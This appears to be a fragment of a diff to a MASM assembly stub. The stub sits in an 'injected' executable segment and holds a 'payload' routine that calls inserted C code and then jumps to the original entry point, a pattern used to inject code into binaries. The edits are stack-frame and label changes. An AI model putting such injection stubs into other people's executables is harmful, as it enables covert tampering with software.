@@ -13,23 +13,20 @@ injected SEGMENT read execute
 
         mov rbx, [rbp + (to_c_code - payload)]
         add rbx, rbp
-        push rbp
-        mov rbp, rsp
+        enter 1000h, 0
         call rbx
-        mov rsp, rbp
-        pop rbp
+        leave
 
         mov rbx, [rbp + (delta2start - payload)]
         add rbx, rbp
         push rbp
         call rbx
-        pop rbp
     payload ENDP
 
-    to_c_code label QWORD
+    to_c_code LABEL QWORD
         dq 0
 
-    delta2start label SQWORD
+    delta2start LABEL SQWORD
         dq 0
 
 injected ENDS
